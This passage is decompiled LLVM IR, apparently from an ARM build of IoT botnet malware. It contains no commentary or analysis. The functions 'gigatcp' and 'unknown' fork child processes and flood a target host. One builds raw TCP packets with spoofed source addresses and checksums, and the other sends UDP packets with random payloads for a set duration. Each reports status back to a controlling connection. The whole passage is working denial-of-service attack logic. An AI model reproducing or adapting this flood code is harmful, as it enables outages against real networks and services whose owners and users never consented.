  uselistorder label %dec_label_pc_10670, { 1, 0 }
  uselistorder label %dec_label_pc_10464, { 1, 0 }
  uselistorder label %dec_label_pc_101dc, { 1, 0 }
  uselistorder label %dec_label_pc_10224.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_101ac, { 1, 0 }
}

define i32 @gigatcp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp71 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-124 = alloca i8, align 1
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_106a4 = load i32, i32* @fp, align 4
  store i32 %v3_106a4, i32* %stack_var_-16, align 4
  store i32 67244, i32* %stack_var_-4, align 4
  %v13_106a4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_106a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_106a8, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_37af4.448 to i32), i32* @r3, align 4
  %v2_106c4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 80, i32* @ip, align 4
  store i32 %v2_106c4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_37af4.448 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_106d8 = call i32 @memcpy()
  store i32 ptrtoint (i32* @global_var_37a78.450 to i32), i32* @r3, align 4
  %v2_106f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 124, i32* @ip, align 4
  store i32 %v2_106f0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_37a78.450 to i32), i32* @r1, align 4
  store i32 124, i32* @r2, align 4
  %v0_10704 = call i32 @memcpy()
  %v2_10714 = call i32 @__GI_time(i32* null)
  %v1_10724 = call i32 @mfork(i32 %arg2)
  %v2_1072c = icmp eq i32 %v1_10724, 0
  br i1 %v2_1072c, label %dec_label_pc_10734, label %dec_label_pc_110b0

dec_label_pc_10734:                               ; preds = %entry
  %v3_10740 = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_10750 = icmp slt i32 %v3_10740, 0
  br i1 %v1_10750, label %dec_label_pc_10758, label %dec_label_pc_10760

dec_label_pc_10758:                               ; preds = %dec_label_pc_10734
  %v1_1075c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_10760

dec_label_pc_10760:                               ; preds = %dec_label_pc_10734, %dec_label_pc_10758
  %v8_10768 = icmp sgt i32 %arg3, 2
  br i1 %v8_10768, label %dec_label_pc_107d8.preheader, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10760
  store i32 %arg2, i32* @r2, align 4
  %v3_10778 = call i32 @Send(i32 %arg1, i32 ptrtoint ([45 x i8]* @global_var_37b44.452 to i32))
  %v1_10780 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_107d8.preheader

dec_label_pc_107d8.preheader:                     ; preds = %dec_label_pc_10760, %dec_label_pc_1076c
  %v2_107a4 = add i32 %v13_106a4, -256
  %v2_107bc = add i32 %v13_106a4, -68
  br label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_107d8.preheader, %dec_label_pc_10790
  %storemerge1219 = phi i32 [ 0, %dec_label_pc_107d8.preheader ], [ %v1_107d0, %dec_label_pc_10790 ]
  %v3_1079c = mul nuw nsw i32 %storemerge1219, 4
  %v2_107a8 = add i32 %v2_107a4, %v3_1079c
  %v1_107ac = inttoptr i32 %v2_107a8 to i32*
  %v2_107ac = load i32, i32* %v1_107ac, align 4
  %v2_107c0 = add i32 %v2_107bc, %storemerge1219
  %v1_107c8 = trunc i32 %v2_107ac to i8
  %v3_107c8 = inttoptr i32 %v2_107c0 to i8*
  store i8 %v1_107c8, i8* %v3_107c8, align 1
  %v1_107d0 = add nuw nsw i32 %storemerge1219, 1
  %v7_107e0 = icmp slt i32 %v1_107d0, 20
  br i1 %v7_107e0, label %dec_label_pc_10790, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_10790
  %v1_107e8 = add i32 %arg4, 4
  %v1_107ec = inttoptr i32 %v1_107e8 to i32*
  %v2_107ec = load i32, i32* %v1_107ec, align 4
  %v2_107f8 = call i32 @host2ip(i32 %arg2, i32 %v2_107ec)
  %v1_10808 = add i32 %arg4, 12
  %v1_1080c = inttoptr i32 %v1_10808 to i32*
  %v2_1080c = load i32, i32* %v1_1080c, align 4
  store i32 %v2_1080c, i32* @r0, align 4
  %v1_10814 = call i32 @atol(i32 %v2_1080c)
  %v1_10830 = add i32 %arg4, 8
  %v1_10834 = inttoptr i32 %v1_10830 to i32*
  store i32 %arg2, i32* @r2, align 4
  %v3_1084c = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_37b74.454 to i32))
  store i32 2, i32* %stack_var_-192, align 4
  store i8 69, i8* %stack_var_-124, align 1
  %v1_10994 = and i8 %tmp71, -64
  %v2_109b4 = load i32, i32* %v1_10834, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_37bb8.456 to i32), i32* @r1, align 4
  %v3_109c0 = inttoptr i32 %v2_109b4 to i8*
  %v4_109c0 = call i32 @__GI_strcoll(i8* %v3_109c0, i32 ptrtoint ([4 x i8]* @global_var_37bb8.456 to i32))
  %v2_109c8 = icmp eq i32 %v4_109c0, 0
  br i1 %v2_109c8, label %dec_label_pc_109d0, label %dec_label_pc_10a94

dec_label_pc_109d0:                               ; preds = %dec_label_pc_107e4
  br label %dec_label_pc_10e6c.preheader

dec_label_pc_10a94:                               ; preds = %dec_label_pc_107e4
  %v2_10a9c = load i32, i32* %v1_10834, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_37bbc.458 to i32), i32* @r1, align 4
  %v3_10aa8 = inttoptr i32 %v2_10a9c to i8*
  %v4_10aa8 = call i32 @__GI_strcoll(i8* %v3_10aa8, i32 ptrtoint ([5 x i8]* @global_var_37bbc.458 to i32))
  %v2_10ab0 = icmp eq i32 %v4_10aa8, 0
  br i1 %v2_10ab0, label %dec_label_pc_10ab8, label %dec_label_pc_10b1c

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_10a94
  br label %dec_label_pc_10e6c.preheader

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10a94
  %v2_10b24 = load i32, i32* %v1_10834, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_37bc4.460 to i32), i32* @r1, align 4
  %v3_10b30 = inttoptr i32 %v2_10b24 to i8*
  %v4_10b30 = call i32 @__GI_strcoll(i8* %v3_10b30, i32 ptrtoint ([5 x i8]* @global_var_37bc4.460 to i32))
  %v2_10b38 = icmp eq i32 %v4_10b30, 0
  br i1 %v2_10b38, label %dec_label_pc_10b40, label %dec_label_pc_10b84

dec_label_pc_10b40:                               ; preds = %dec_label_pc_10b1c
  br label %dec_label_pc_10e6c.preheader

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b1c
  %v2_10b8c = load i32, i32* %v1_10834, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_37bcc.462 to i32), i32* @r1, align 4
  %v3_10b98 = inttoptr i32 %v2_10b8c to i8*
  %v4_10b98 = call i32 @__GI_strcoll(i8* %v3_10b98, i32 ptrtoint ([7 x i8]* @global_var_37bcc.462 to i32))
  %v2_10ba0 = icmp eq i32 %v4_10b98, 0
  br i1 %v2_10ba0, label %dec_label_pc_10ba8, label %dec_label_pc_10bec

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b84
  br label %dec_label_pc_10e6c.preheader

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10b84
  %v2_10bf4 = load i32, i32* %v1_10834, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_37bd4.464 to i32), i32* @r1, align 4
  %v3_10c00 = inttoptr i32 %v2_10bf4 to i8*
  %v4_10c00 = call i32 @__GI_strcoll(i8* %v3_10c00, i32 ptrtoint ([8 x i8]* @global_var_37bd4.464 to i32))
  %v2_10c08 = icmp eq i32 %v4_10c00, 0
  br i1 %v2_10c08, label %dec_label_pc_10c10, label %dec_label_pc_10c74

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10bec
  br label %dec_label_pc_10e6c.preheader

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10bec
  %v2_10c7c = load i32, i32* %v1_10834, align 4
  store i32 %v2_10c7c, i32* @r0, align 4
  %v2_10c88 = call i32 @__GI_strtok(i32 %v2_10c7c, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_10e2c16 = icmp eq i32 %v2_10c88, 0
  br i1 %v2_10e2c16, label %dec_label_pc_10e6c.preheader, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c74, %dec_label_pc_10e14
  %storemerge1418 = phi i32 [ %v2_10e1c, %dec_label_pc_10e14 ], [ %v2_10c88, %dec_label_pc_10c74 ]
  %stack_var_-91.117 = phi i8 [ %stack_var_-91.0, %dec_label_pc_10e14 ], [ %v1_10994, %dec_label_pc_10c74 ]
  store i32 ptrtoint ([4 x i8]* @global_var_37be0.468 to i32), i32* @r1, align 4
  %v3_10ca4 = inttoptr i32 %storemerge1418 to i8*
  %v4_10ca4 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37be0.468 to i32))
  %v2_10cac = icmp eq i32 %v4_10ca4, 0
  br i1 %v2_10cac, label %dec_label_pc_10cb4, label %dec_label_pc_10cd8

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c98
  %v1_10cc4 = or i8 %stack_var_-91.117, 2
  br label %dec_label_pc_10e14

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10c98
  store i32 ptrtoint ([4 x i8]* @global_var_37be4.470 to i32), i32* @r1, align 4
  %v4_10ce4 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37be4.470 to i32))
  %v2_10cec = icmp eq i32 %v4_10ce4, 0
  br i1 %v2_10cec, label %dec_label_pc_10cf4, label %dec_label_pc_10d18

dec_label_pc_10cf4:                               ; preds = %dec_label_pc_10cd8
  %v1_10d04 = or i8 %stack_var_-91.117, 4
  br label %dec_label_pc_10e14

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10cd8
  store i32 ptrtoint ([4 x i8]* @global_var_37be8.472 to i32), i32* @r1, align 4
  %v4_10d24 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37be8.472 to i32))
  %v2_10d2c = icmp eq i32 %v4_10d24, 0
  br i1 %v2_10d2c, label %dec_label_pc_10d34, label %dec_label_pc_10d58

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d18
  %v1_10d44 = or i8 %stack_var_-91.117, 1
  br label %dec_label_pc_10e14

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d18
  store i32 ptrtoint ([4 x i8]* @global_var_37bec.474 to i32), i32* @r1, align 4
  %v4_10d64 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37bec.474 to i32))
  %v2_10d6c = icmp eq i32 %v4_10d64, 0
  br i1 %v2_10d6c, label %dec_label_pc_10d74, label %dec_label_pc_10d98

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d58
  %v1_10d84 = or i8 %stack_var_-91.117, 16
  br label %dec_label_pc_10e14

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d58
  store i32 ptrtoint ([4 x i8]* @global_var_37bf0.476 to i32), i32* @r1, align 4
  %v4_10da4 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37bf0.476 to i32))
  %v2_10dac = icmp eq i32 %v4_10da4, 0
  br i1 %v2_10dac, label %dec_label_pc_10db4, label %dec_label_pc_10dd8

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10d98
  %v1_10dc4 = or i8 %stack_var_-91.117, 8
  br label %dec_label_pc_10e14

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10d98
  store i32 ptrtoint ([4 x i8]* @global_var_37bf4.478 to i32), i32* @r1, align 4
  %v4_10de4 = call i32 @__GI_strcoll(i8* %v3_10ca4, i32 ptrtoint ([4 x i8]* @global_var_37bf4.478 to i32))
  %v2_10dec = icmp eq i32 %v4_10de4, 0
  br i1 %v2_10dec, label %dec_label_pc_10df4, label %dec_label_pc_10e14

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10dd8
  %v1_10e04 = or i8 %stack_var_-91.117, 32
  br label %dec_label_pc_10e14

dec_label_pc_10e14:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10db4, %dec_label_pc_10d74, %dec_label_pc_10d34, %dec_label_pc_10cf4, %dec_label_pc_10cb4, %dec_label_pc_10df4
  %stack_var_-91.0 = phi i8 [ %v1_10cc4, %dec_label_pc_10cb4 ], [ %v1_10d04, %dec_label_pc_10cf4 ], [ %v1_10d44, %dec_label_pc_10d34 ], [ %v1_10d84, %dec_label_pc_10d74 ], [ %v1_10dc4, %dec_label_pc_10db4 ], [ %v1_10e04, %dec_label_pc_10df4 ], [ %stack_var_-91.117, %dec_label_pc_10dd8 ]
  store i32 0, i32* @r0, align 4
  %v2_10e1c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_10e2c = icmp eq i32 %v2_10e1c, 0
  br i1 %v2_10e2c, label %dec_label_pc_10e6c.preheader, label %dec_label_pc_10c98

dec_label_pc_10e6c.preheader:                     ; preds = %dec_label_pc_10e14, %dec_label_pc_10c74, %dec_label_pc_10c10, %dec_label_pc_10ba8, %dec_label_pc_10b40, %dec_label_pc_10ab8, %dec_label_pc_109d0
  %v2_10f38 = ptrtoint i8* %stack_var_-124 to i32
  %v2_10f44 = bitcast i8* %stack_var_-124 to i16*
  %v2_10fd4 = ptrtoint i32* %stack_var_-104 to i32
  %v2_10fdc = ptrtoint i32* %stack_var_-164 to i32
  %v2_10ff4 = ptrtoint i32* %stack_var_-84 to i32
  %v2_10ffc = ptrtoint i32* %stack_var_-144 to i32
  %v2_11024 = bitcast i32* %stack_var_-176 to i16*
  %v2_11038 = ptrtoint i32* %stack_var_-192 to i32
  %v2_11084 = add i32 %v1_10814, %v2_10714
  br label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e6c.preheader, %dec_label_pc_110a0
  %storemerge = phi i32 [ %v1_110a4, %dec_label_pc_110a0 ], [ 0, %dec_label_pc_10e6c.preheader ]
  %v2_10e74 = call i32 @realrand(i32 0, i32 31)
  %v0_10e9c = call i32 @getspoof()
  %v1_10ec4 = call i32 @__GI_htons(i32 60)
  %v0_10ed0 = call i32 @rand()
  %v3_10efc = urem i32 %v0_10e9c, 65536
  store i32 %v3_10efc, i32* %stack_var_-104, align 4
  %v0_10f14 = call i32 @rand()
  %v3_10f44 = call i32 @in_cksum(i16* %v2_10f44, i32 20)
  %v0_10f50 = call i32 @rand()
  store i32 %v0_10e9c, i32* %stack_var_-176, align 4
  %v1_10fc4 = call i32 @__GI_htons(i32 40)
  store i32 %v2_10fdc, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_10fec = call i32 @bcopy(i32 %v2_10fd4, i32 %v2_10fdc, i32 20)
  store i32 %v2_10ffc, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_1100c = call i32 @bcopy(i32 %v2_10ff4, i32 %v2_10ffc, i32 20)
  %v3_11024 = call i32 @in_cksum(i16* %v2_11024, i32 52)
  %v6_1105c = call i32 @sendto(i32 %v3_10740, i32 %v2_10f38, i32 60, i32 0, i32 %v2_11038, i32 16)
  %tmp = icmp ult i32 %storemerge, 100
  br i1 %tmp, label %dec_label_pc_110a0, label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_10e6c
  %v2_11070 = call i32 @__GI_time(i32* null)
  %v3_11088 = icmp ult i32 %v2_11070, %v2_11084
  br i1 %v3_11088, label %dec_label_pc_11098, label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %dec_label_pc_1106c
  %v1_11094 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11098

dec_label_pc_11098:                               ; preds = %dec_label_pc_1106c, %dec_label_pc_11090
  br label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %dec_label_pc_10e6c, %dec_label_pc_11098
  %stack_var_-64.1 = phi i32 [ %storemerge, %dec_label_pc_10e6c ], [ 0, %dec_label_pc_11098 ]
  %v1_110a4 = add i32 %stack_var_-64.1, 1
  br label %dec_label_pc_10e6c

dec_label_pc_110b0:                               ; preds = %entry
  ret i32 %v1_10724

; uselistorder directives
  uselistorder i32 %v0_10e9c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10e1c, { 1, 0 }
  uselistorder i8 %stack_var_-91.117, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge1219, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
  uselistorder label %dec_label_pc_11098, { 1, 0 }
  uselistorder label %dec_label_pc_10e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10e14, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10790, { 1, 0 }
  uselistorder label %dec_label_pc_107d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10760, { 1, 0 }
}

define i32 @makeRandomShit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_11100 = load i32, i32* @r4, align 4
  %v6_11100 = load i32, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_11118 = call i32 @__GI_time(i32* null)
  store i32 %v2_11118, i32* %r0.global-to-local, align 4
  %v1_11124 = call i32 @srand(i32 %v2_11118)
  store i32 %v1_11124, i32* %r0.global-to-local, align 4
  %v5_111b419 = icmp sgt i32 %arg2, 0
  br i1 %v5_111b419, label %dec_label_pc_1113c, label %dec_label_pc_111b8

dec_label_pc_1113c:                               ; preds = %entry, %dec_label_pc_1113c
  %storemerge120 = phi i32 [ %v1_111a0, %dec_label_pc_1113c ], [ 0, %entry ]
  %v2_11148 = add i32 %storemerge120, %arg1
  store i32 %v2_11148, i32* @r4, align 4
  %v0_1114c = call i32 @rand()
  store i32 %v0_1114c, i32* %r0.global-to-local, align 4
  %v2_11168 = sdiv i32 %v0_1114c, 51
  %tmp12 = mul i32 %v2_11168, -255
  %v2_11180 = add i32 %tmp12, %v0_1114c
  %fold = add i32 %v2_11180, 1
  %v1_11198 = trunc i32 %fold to i8
  %v2_11198 = load i32, i32* @r4, align 4
  %v3_11198 = inttoptr i32 %v2_11198 to i8*
  store i8 %v1_11198, i8* %v3_11198, align 1
  %v1_111a0 = add nuw nsw i32 %storemerge120, 1
  %v5_111b4 = icmp slt i32 %v1_111a0, %arg2
  br i1 %v5_111b4, label %dec_label_pc_1113c, label %dec_label_pc_111a8.dec_label_pc_111b8_crit_edge

dec_label_pc_111a8.dec_label_pc_111b8_crit_edge:  ; preds = %dec_label_pc_1113c
  %v1_111c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_111b8

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111a8.dec_label_pc_111b8_crit_edge, %entry
  %v1_111c0 = phi i32 [ %v1_111c0.pre, %dec_label_pc_111a8.dec_label_pc_111b8_crit_edge ], [ %v1_11124, %entry ]
  store i32 %v3_11100, i32* @r4, align 4
  store i32 %v6_11100, i32* @fp, align 4
  ret i32 %v1_111c0

; uselistorder directives
  uselistorder i32 %v1_111a0, { 1, 0 }
  uselistorder i32 %v0_1114c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1113c, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 70100, i32* %stack_var_-4, align 4
  %v2_111d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_111d0, i32* @fp, align 4
  %v2_111fc = call i32 @__GI_time(i32* null)
  %v8_11210 = icmp sgt i32 %arg3, 3
  br i1 %v8_11210, label %dec_label_pc_1122c, label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_11220 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_37bf8.481 to i32))
  %v1_11228 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %entry, %dec_label_pc_11214
  %v1_11230 = call i32 @mfork(i32 %arg2)
  %v2_11238 = icmp eq i32 %v1_11230, 0
  br i1 %v2_11238, label %dec_label_pc_11240, label %dec_label_pc_11504

dec_label_pc_11240:                               ; preds = %dec_label_pc_1122c
  %v1_11244 = call i32 @malloc(i32 1024)
  store i32 %v1_11244, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1125c = call i32 @__GI_memset()
  %v1_11264 = add i32 %arg4, 8
  %v1_11268 = inttoptr i32 %v1_11264 to i32*
  %v2_11268 = load i32, i32* %v1_11268, align 4
  store i32 ptrtoint (i32* @global_var_37c50.483 to i32), i32* @r1, align 4
  %v2_11274 = inttoptr i32 %v2_11268 to i8*
  %v3_11274 = call i32 @__GI_strcoll(i8* %v2_11274, i32 ptrtoint (i32* @global_var_37c50.483 to i32))
  %v2_1127c = icmp eq i32 %v3_11274, 0
  br i1 %v2_1127c, label %dec_label_pc_11284, label %dec_label_pc_1128c

dec_label_pc_11284:                               ; preds = %dec_label_pc_11240
  br label %dec_label_pc_1128c

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11240, %dec_label_pc_11284
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_11284 ], [ 0, %dec_label_pc_11240 ]
  %v1_11290 = add i32 %arg4, 12
  %v1_11294 = inttoptr i32 %v1_11290 to i32*
  %v2_11294 = load i32, i32* %v1_11294, align 4
  store i32 ptrtoint (i32* @global_var_37c50.483 to i32), i32* @r1, align 4
  %v2_112a0 = inttoptr i32 %v2_11294 to i8*
  %v3_112a0 = call i32 @__GI_strcoll(i8* %v2_112a0, i32 ptrtoint (i32* @global_var_37c50.483 to i32))
  %v2_112a8 = icmp eq i32 %v3_112a0, 0
  br i1 %v2_112a8, label %dec_label_pc_112d4, label %dec_label_pc_112c4

dec_label_pc_112c4:                               ; preds = %dec_label_pc_1128c
  br label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_1128c, %dec_label_pc_112c4
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_112c4 ], [ 1, %dec_label_pc_1128c ]
  %v2_112d8 = call i32 @__GI_time(i32* null)
  %v1_112e4 = call i32 @srand(i32 %v2_112d8)
  %v1_112ec = add i32 %arg4, 16
  %v1_112f0 = inttoptr i32 %v1_112ec to i32*
  %v2_112f0 = load i32, i32* %v1_112f0, align 4
  store i32 %v2_112f0, i32* @r0, align 4
  %v1_112f8 = call i32 @atol(i32 %v2_112f0)
  %v2_11304 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_11304, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_11314 = call i32 @__GI_memset()
  %v1_1131c = add i32 %arg4, 4
  %v1_11320 = inttoptr i32 %v1_1131c to i32*
  %v2_11320 = load i32, i32* %v1_11320, align 4
  %v2_1132c = call i32 @host2ip(i32 %arg2, i32 %v2_11320)
  store i32 2, i32* %stack_var_-76, align 4
  %v2_11344 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v2_11344, label %dec_label_pc_1134c, label %dec_label_pc_1138c

dec_label_pc_1134c:                               ; preds = %dec_label_pc_112d4
  %v2_11354 = load i32, i32* %v1_11268, align 4
  store i32 %v2_11354, i32* @r0, align 4
  %v1_1135c = call i32 @atol(i32 %v2_11354)
  %v3_11368 = urem i32 %v1_1135c, 65536
  %v1_11370 = call i32 @__GI_htons(i32 %v3_11368)
  br label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_112d4, %dec_label_pc_1134c
  store i32 %arg2, i32* @r2, align 4
  %v3_113c0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_37c5c.487 to i32))
  %v7_113c8 = icmp eq i32 %stack_var_-44.0, 1
  %v7_11404 = icmp eq i32 %stack_var_-40.0, 1
  %v2_114d0 = add i32 %v1_112f8, %v2_111fc
  %v1_11478 = inttoptr i32 %v1_11244 to i8*
  br label %dec_label_pc_113c4

dec_label_pc_113c4:                               ; preds = %dec_label_pc_114e4, %dec_label_pc_1138c
  %stack_var_-56.0 = phi i32 [ %tmp, %dec_label_pc_1138c ], [ %v1_114e8, %dec_label_pc_114e4 ]
  br i1 %v7_113c8, label %dec_label_pc_113d0, label %dec_label_pc_11400

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113c4
  %v2_113e0 = call i32 @realrand(i32 1026, i32 65535)
  %v3_113ec = urem i32 %v2_113e0, 65536
  %v1_113f4 = call i32 @__GI_htons(i32 %v3_113ec)
  br label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_113c4, %dec_label_pc_113d0
  br i1 %v7_11404, label %dec_label_pc_1140c, label %dec_label_pc_1142c

dec_label_pc_1140c:                               ; preds = %dec_label_pc_11400
  %v2_11414 = call i32 @realrand(i32 64, i32 1024)
  %v2_11424 = call i32 @makeRandomShit(i32 %v1_11244, i32 %v2_11414)
  br label %dec_label_pc_11450

dec_label_pc_1142c:                               ; preds = %dec_label_pc_11400
  %v2_11434 = load i32, i32* %v1_11294, align 4
  store i32 %v2_11434, i32* @r0, align 4
  %v1_1143c = call i32 @atol(i32 %v2_11434)
  %v2_1144c = call i32 @makeRandomShit(i32 %v1_11244, i32 %v1_1143c)
  br label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_1140c, %dec_label_pc_1142c
  %v3_1145c = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_1146c = icmp slt i32 %v3_1145c, 0
  br i1 %v1_1146c, label %dec_label_pc_114ac, label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %dec_label_pc_11450
  %v3_1147c = call i32 @strlen(i8* %v1_11478)
  %v7_114a0 = call i32 @sendto(i32 %v3_1145c, i32 %v1_11244, i32 %v3_1147c, i32 0, i32 %v2_11304, i32 16)
  %v1_114a8 = call i32 @close(i32 %v3_1145c)
  br label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %dec_label_pc_11450, %dec_label_pc_11474
  %v7_114b4 = icmp slt i32 %stack_var_-56.0, 100
  br i1 %v7_114b4, label %dec_label_pc_114e4, label %dec_label_pc_114b8

dec_label_pc_114b8:                               ; preds = %dec_label_pc_114ac
  %v2_114bc = call i32 @__GI_time(i32* null)
  %v3_114d4 = icmp ult i32 %v2_114bc, %v2_114d0
  br i1 %v3_114d4, label %dec_label_pc_114dc, label %dec_label_pc_114f4

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114b8
  br label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114ac, %dec_label_pc_114dc
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_114ac ], [ 0, %dec_label_pc_114dc ]
  %v1_114e8 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_113c4

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114b8
  %v1_114f8 = call i32 @close(i32 %v3_1145c)
  %v1_11500 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_1122c, %dec_label_pc_114f4
  %v1_1150c = phi i32 [ %v1_11230, %dec_label_pc_1122c ], [ %v1_11500, %dec_label_pc_114f4 ]
  ret i32 %v1_1150c

; uselistorder directives
  uselistorder i32 %v1_11244, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @host2ip, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_37c50.483 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11504, { 1, 0 }
  uselistorder label %dec_label_pc_114e4, { 1, 0 }
  uselistorder label %dec_label_pc_114ac, { 1, 0 }
  uselistorder label %dec_label_pc_11450, { 1, 0 }
  uselistorder label %dec_label_pc_11400, { 1, 0 }
  uselistorder label %dec_label_pc_1138c, { 1, 0 }
  uselistorder label %dec_label_pc_112d4, { 1, 0 }
